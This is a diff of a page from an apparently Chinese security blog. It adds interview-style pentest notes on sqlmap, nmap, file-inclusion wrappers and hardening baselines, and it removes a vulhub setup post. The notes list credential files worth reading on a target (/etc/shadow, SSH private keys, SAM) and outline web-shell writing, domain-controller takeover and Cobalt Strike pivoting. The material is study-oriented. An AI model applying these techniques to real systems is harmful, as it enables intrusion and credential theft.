+<p>脚本绕过操作：将所有空格替换为使用随机文本来截断注释，要开始使用篡改脚本，需先使用 –tamper 参数，后面再加上脚本的名称</p>
+<h1 id="java实现rce的函数"><a href="#java实现rce的函数" class="headerlink" title="java实现rce的函数"></a>java实现rce的函数</h1><p>Runtime.getruntieme.exec(“cmd”)</p>
+<p>new ProcessBuilder().start(“cmd”)</p>
+<h1 id="struct2流量特征"><a href="#struct2流量特征" class="headerlink" title="struct2流量特征"></a>struct2流量特征</h1><p>strut s2 </p>
+<p>特征：ognl表达式</p>
+<h1 id="nmap常用参数"><a href="#nmap常用参数" class="headerlink" title="nmap常用参数"></a>nmap常用参数</h1><p>端口状态概述 open 开放 closed 关闭 filtered 被过滤掉了，无法进行判断 unfiltered 未被过滤可以进行访问<br>参数：<br>1、-Pn 跳过主机发现，视为所有的主机都在线<br>2、sn 只做ping扫描不做端口扫描<br>3、sT\A\W\M 不同的扫描端口，进行扫描<br>4、-p 指定端口进行扫描 –exclude-ports：排除端口进行扫描<br>5、-sV 探测系统的版本<br>–version-intensity：设置相关的程度，详细级别，0~9 越高越详细<br>–version-trace：打印详细的版本扫描过程<br>6、脚本扫描<br>–scri= ：指定对应的脚本名称<br>7、O：激活系统的探测<br>–osscan-limit：只对开放端口的有效主机进行系统的探测<br>8、-T&lt;0-5&gt;:时间模板，越大速度越快<br>9、-6：使能IPV6探测<br>10、-A：使能系统探测、版本检测、脚本扫描、路由追踪<br>11、-V：打印版本号<br>12、-v：增加输出的详细程度<br>ps://blog.csdn.net/weixin_45837168/article/details/122893544</p>
+<h1 id="nginx日志分析"><a href="#nginx日志分析" class="headerlink" title="nginx日志分析"></a>nginx日志分析</h1><p><strong>Nginx的日志放在那里，如何进行分析?主要看哪些你认为重要的地方？</strong></p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1mtwZURvGTnuLQX4zBvtYlCPbOm0XIdcBrdd23EKTxQgGedN3BiayXfoJoDGvkOCaGhU8X7kqkXVB3bgh6RPF9Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p>配置文件/etc/nginx/nginx.conf</p>
+<p>Nginx的日志分为访问日志access_log和错误日志error_log两大块，前者主要记录用户每次访问的情况，后者则侧重于服务器的具体错误，比如返回403的具体原因是文件不可读还是权限不足之类的。</p>
+<p>分析access_log</p>
+<p>1、可以根据每个所关心的字段读取频率最高的前十看看是否有什么出乎意料的情况，以客户端IP，客户端User-Agent，<br>以及返回<strong>状态码</strong>为例。</p>
+<p>2、流量观察:对于一般网站来说流量监控也是比较重要的，所以根据访问时间，可以统计出每天的访问量和一天中平均各个时间段的访问量：</p>
+<p>分析error_log：</p>
+<p>错误类型、路径错误、SEO（搜索引擎优化）、查错示例</p>
+<h1 id="文件包含漏洞协议"><a href="#文件包含漏洞协议" class="headerlink" title="文件包含漏洞协议"></a>文件包含漏洞协议</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">file:///var/www/html 访问本地文件系统</span><br><span class="line"></span><br><span class="line">ftp://&lt;login&gt;:&lt;password&gt;@&lt;ftpserveraddress&gt; 访问 FTP(s) URLs</span><br><span class="line"></span><br><span class="line">data:// 数据流</span><br><span class="line"></span><br><span class="line">http:// — 访问 HTTP(s) URLs</span><br><span class="line"></span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line"></span><br><span class="line">php:// — 访问各个输入/输出流</span><br><span class="line"></span><br><span class="line">zlib:// — 压缩流</span><br><span class="line"></span><br><span class="line">data:// — Data (RFC 2397)</span><br><span class="line"></span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line"></span><br><span class="line">phar:// — PHP Archive</span><br><span class="line"></span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line"></span><br><span class="line">rar:// — RAR</span><br><span class="line"></span><br><span class="line">ogg:// — Audio streams</span><br><span class="line"></span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure>
+
+<h1 id="基线规范"><a href="#基线规范" class="headerlink" title="基线规范"></a>基线规范</h1><h2 id="linux基线规范"><a href="#linux基线规范" class="headerlink" title="linux基线规范"></a>linux基线规范</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1账号管理和授权</span><br><span class="line"></span><br><span class="line">检查特殊账号，是否存在空密码的账户和 root 权限账户</span><br><span class="line">禁用或删除无用账号</span><br><span class="line">添加口令策略:/etc/login.defs修改配置文件，设置过期时间、连续认证失败次数</span><br><span class="line">禁止 root 远程登录，限制root用户直接登录。</span><br><span class="line">检查 su 权限。vi /etc/pam.d/su添加auth required pam_wheel.so group=test</span><br><span class="line"></span><br><span class="line">2服务</span><br><span class="line"></span><br><span class="line">关闭不必要的服务</span><br><span class="line">SSH 服务安全</span><br><span class="line">不允许 root 账号直接登录系统，PermitRootLogin=no</span><br><span class="line">修改 SSH 使用的协议版本为 2</span><br><span class="line">修改允许密码错误次数（默认 6 次），MaxAuthTries=3</span><br><span class="line"></span><br><span class="line">3文件系统</span><br><span class="line"></span><br><span class="line">设置 umask 值 vi /etc/profile 添加行 umask 027</span><br><span class="line">设置登录超时 vi /etc/profile 修改配置文件，将以 TMOUT= 开头的行注释，设置为 TMOUT=180</span><br><span class="line"></span><br><span class="line">4日志</span><br><span class="line"></span><br><span class="line">启用 syslogd 日志，配置日志目录权限，或者设置日志服务器</span><br><span class="line">记录所有用户的登录和操作日志，通过脚本代码实现记录所有用户的登录操作日志，防止出现安全事件后无据可查</span><br><span class="line"></span><br><span class="line">5IP 协议安全要求</span><br><span class="line"></span><br><span class="line">远程登录取消 telnet 采用 ssh</span><br><span class="line">设置 /etc/hosts.allow 和 deny</span><br><span class="line">禁止 ICMP 重定向</span><br><span class="line">禁止源路由转发</span><br><span class="line">防 ssh 破解，iptables (对已经建立的所有链接都放行，限制每分钟连接 ssh 的次数)+ denyhost (添加 ip 拒绝访问)</span><br></pre></td></tr></table></figure>
+
+<h2 id="windows安全基线"><a href="#windows安全基线" class="headerlink" title="windows安全基线"></a>windows安全基线</h2><p>主要包括五个方面：身份鉴别、访问控制、安全审计、资源控制、剩余信息保护</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1身份鉴别</span><br><span class="line"></span><br><span class="line">更改缺省账户</span><br><span class="line">检查Guest用户是否禁用</span><br><span class="line">密码复杂性要求</span><br><span class="line">密码长度最小不能小于8位</span><br><span class="line"></span><br><span class="line">2访问控制</span><br><span class="line"></span><br><span class="line">共享账户检查</span><br><span class="line">远程关机授权</span><br><span class="line">本地关机</span><br><span class="line">授权帐户登陆</span><br><span class="line"></span><br><span class="line">3安全审计</span><br><span class="line"></span><br><span class="line">用户登录日志记录</span><br><span class="line">系统日志完备性检查</span><br><span class="line">登录超时管理</span><br><span class="line"></span><br><span class="line">4资源控制</span><br><span class="line"></span><br><span class="line">登录超时管理</span><br><span class="line">远程登录超时配置</span><br><span class="line"></span><br><span class="line">5剩余信息保护</span><br><span class="line"></span><br><span class="line">不显示上次的用户名</span><br><span class="line">关机前清除虚拟内存页面</span><br><span class="line">不启用可还原的加密来存储密码</span><br></pre></td></tr></table></figure>
+
+<h2 id="中间件基线规范"><a href="#中间件基线规范" class="headerlink" title="中间件基线规范"></a>中间件基线规范</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1配置</span><br><span class="line"></span><br><span class="line">账号</span><br><span class="line">授权</span><br><span class="line">日志</span><br><span class="line">session 过期时间（防ddos）</span><br><span class="line">绑定监听地址</span><br><span class="line"></span><br><span class="line">2禁止</span><br><span class="line"></span><br><span class="line">目录权限</span><br><span class="line">访问外部文件</span><br><span class="line">CGI</span><br><span class="line">非法HTTP方法（PUT DELETE）</span><br><span class="line"></span><br><span class="line">3隐藏</span><br><span class="line"></span><br><span class="line">服务版本号</span><br><span class="line">重定向错误页面</span><br><span class="line"></span><br><span class="line">4删除</span><br><span class="line"></span><br><span class="line">配置文件</span><br><span class="line">默认安装的无用文件</span><br></pre></td></tr></table></figure>
+
+<h1 id="DDOS-CC应急思路以及如何防范"><a href="#DDOS-CC应急思路以及如何防范" class="headerlink" title="DDOS CC应急思路以及如何防范"></a>DDOS CC应急思路以及如何防范</h1><p>目前对于低网络层的 DDoS 攻击有一些有效的防护手段，如丢弃第一次 SYN 包，上流量防护设备，上 WAF 封禁地址等</p>
+<p>比较难缠的是第七层，第八层的 CC 攻击，它会找到目标网站上比较消耗资源的关键位置，重复发起攻击以消耗 CPU/内存/数据库/IO 等资源，目前的应付手段有：</p>
+<ol>
+<li>优化资源消耗高位置的代码</li>
+<li>增加硬件设备</li>
+<li>上云</li>
+<li>购买专业安全公司的安全服务</li>
+<li>除此之外，隐藏服务器的真实 IP、上云 WAF、CDN、 负载均衡等设备，或者暂时将域名解析到公安网警网站等也是可以作为选择方案</li>
+</ol>
+<ul>
+<li>网络设备设施<ul>
+<li>拼带宽，加大带宽，但是成本太高</li>
+<li>使用硬件防火墙</li>
+<li>选用高性能设备</li>
+</ul>
+</li>
+<li>抗 D 思想和方案<ul>
+<li>负载均衡</li>
+<li>花钱买流量清洗服务</li>
+<li>CDN：web 层，比如 cc 攻击</li>
+<li>分布式集群防御</li>
+<li>高防：防大部分攻击，udp、大型的 cc 攻击</li>
+</ul>
+</li>
+<li>预防为主<ul>
+<li>系统漏洞</li>
+<li>系统资源优化</li>
+<li>过滤不必要的服务和端口</li>
+<li>限制特定流量：检查访问来源做适当限制</li>
+</ul>
+</li>
+</ul>
+<h1 id="windows和linux的敏感文件"><a href="#windows和linux的敏感文件" class="headerlink" title="windows和linux的敏感文件"></a>windows和linux的敏感文件</h1><p>windows</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\boot.ini //查看系统版本</span><br><span class="line">C:\Windows\System32\inetsrv\MetaBase.xml //IIS 配置文件</span><br><span class="line">C:\Windows\repair\sam //存储系统初次安装的密码</span><br><span class="line">C:\Program Files\mysql\my.ini //Mysql 配置</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MY D //Mysql root</span><br><span class="line">C:\Windows\php.ini //php 配置信息</span><br><span class="line">C:\Windows\my.ini //Mysql 配置信息</span><br></pre></td></tr></table></figure>
+
+<p>linux</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">etc/passwd、etc/shadow直接读密码</span><br><span class="line">/etc/hosts # 主机信息</span><br><span class="line">/root/.bashrc # 环境变量</span><br><span class="line">/root/.bash_history # 还有root外的其他用户</span><br><span class="line">/root/.viminfo # vim 信息</span><br><span class="line">/root/.ssh/id_rsa # 拿私钥直接ssh</span><br><span class="line">/proc/xxxx/cmdline # 进程状态枚举 xxxx 可以为0000-9999 使用burpsuite</span><br></pre></td></tr></table></figure>
+
+<h1 id="sqlmap反制"><a href="#sqlmap反制" class="headerlink" title="sqlmap反制"></a>sqlmap反制</h1><p>实际上都是在shell里执行bash命令，构造一种特殊数据包，封闭的双引号中带命令。</p>
+<p><img src="https://pic3.zhimg.com/80/v2-ba97144a5e31a44a4103975bb4b092c6_720w.jpg" alt="img"></p>
+<h1 id="sqlmap写shell的原理"><a href="#sqlmap写shell的原理" class="headerlink" title="sqlmap写shell的原理"></a>sqlmap写shell的原理</h1><p>sqlmap的–os-shell在mysql数据库中的原理，其实就是往服务器上写入了两个php，其中一个给我们提供了文件上传的页面，可以通过这个上传页面上传脚本文件到当前目录下。另外一个则是返回了可以让我们执行系统命令的命令行，命令行也可以在网页url中通过对cmd参数传参执行系统命令。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">利用条件</span><br><span class="line">知道网站的物理路径</span><br><span class="line">高权限数据库用户</span><br><span class="line">secure_file_priv无限制</span><br><span class="line">网站路径有写入权限</span><br></pre></td></tr></table></figure>
+
+<h1 id="拿域控的几种方式"><a href="#拿域控的几种方式" class="headerlink" title="拿域控的几种方式"></a>拿域控的几种方式</h1><p>net time /domain</p>
+<p><strong>利用GPP漏洞获取域管理权限</strong></p>
+<p>SYSVOL是域内的共享文件夹，用来存放登录脚本、组策略脚本等信息。当域管理员通过组策略修改密码时，在脚本中引入用户密码，就可能导致安全问题</p>
+<p><strong>获取服务器明文登录密码</strong></p>
+<p><strong>使用MS14-068漏洞进行提权</strong></p>
+<p><strong>窃取域管理员令牌</strong></p>
+<p><strong>进程迁移</strong></p>
+<p>入侵了域管理员所登录的服务器，将进程迁移到域管理员所运行的进程，就可以获得域管理员权限。</p>
+<h1 id="内网扩大战果"><a href="#内网扩大战果" class="headerlink" title="内网扩大战果"></a>内网扩大战果</h1><p>查看本机的IP地址</p>
+<p>查看路由表</p>
+<p>查看本地连接信息</p>
+<p>利用dns信息</p>
+<p>利用域信息</p>
+<p>使用arp命令</p>
+<p>查看本地的hosts文件</p>
+<p>查看本地用户的连接信息</p>
+<h1 id="java反序列化函数"><a href="#java反序列化函数" class="headerlink" title="java反序列化函数"></a>java反序列化函数</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">序列化：java.io.ObjectOutputStream 类中的 writeObject()</span><br><span class="line"></span><br><span class="line">反序列化：java.io.ObjectInputStream 类中的 readObject()</span><br></pre></td></tr></table></figure>
+
+<h1 id="cs不出网上线的几种方法"><a href="#cs不出网上线的几种方法" class="headerlink" title="cs不出网上线的几种方法"></a>cs不出网上线的几种方法</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">存在一台中转机器：</span><br><span class="line">SMB Beacon</span><br><span class="line">中转listener</span><br><span class="line">HTTP 代理</span><br><span class="line">TCP Beacon(正向)</span><br><span class="line">使用pystinger进行代理转发</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/07/09/CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -497,86 +1011,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/06/02/vulhub%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/06/02/vulhub%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">vulhub安装与使用</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-06-02 20:19:09" itemprop="dateCreated datePublished" datetime="2022-06-02T20:19:09+08:00">2022-06-02</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-08-26 18:13:10" itemprop="dateModified" datetime="2022-08-26T18:13:10+08:00">2022-08-26</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/fuxian/" itemprop="url" rel="index"><span itemprop="name">-fuxian</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="vulhub安装与使用"><a href="#vulhub安装与使用" class="headerlink" title="vulhub安装与使用"></a>vulhub安装与使用</h1><p>首先要个纯净ubuntu</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#1:docker</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install -y docker.io</span><br><span class="line">systemctl enable docker --now</span><br><span class="line">sudo apt install docker-compose</span><br><span class="line"></span><br><span class="line">#2:vulhub</span><br><span class="line">git clone https://github.com/vulhub/vulhub</span><br><span class="line">cd</span><br><span class="line">sudo docker-compose build</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line">sudo docker-compose down -v</span><br><span class="line">sudo docker ps</span><br></pre></td></tr></table></figure>
-
-<h2 id="路径查看"><a href="#路径查看" class="headerlink" title="路径查看"></a>路径查看</h2><p><a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/">Vulhub - Docker-Compose file for vulnerability environment</a></p>
-<h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_48831859/article/details/124197534">(82条消息) 虚拟机与物理机能相互ping通但为什么访问不了vulhub搭建的靶场_灿什么灿的博客-CSDN博客_vulhub无法访问</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_52243589/article/details/121128848">(82条消息) 搭建vulhub以及物理机访问虚拟机docker环境_财鸟的博客-CSDN博客_vulhub虚拟机</a></p>
-<p><a target="_blank" rel="noopener" href="http://dljz.nicethemes.cn/news/show-391495.html">虚拟机与物理机能相互ping通但为什么访问不了vulhub搭建的靶场 (nicethemes.cn)</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -648,7 +1082,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">172</span>
+          <span class="site-state-item-count">173</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
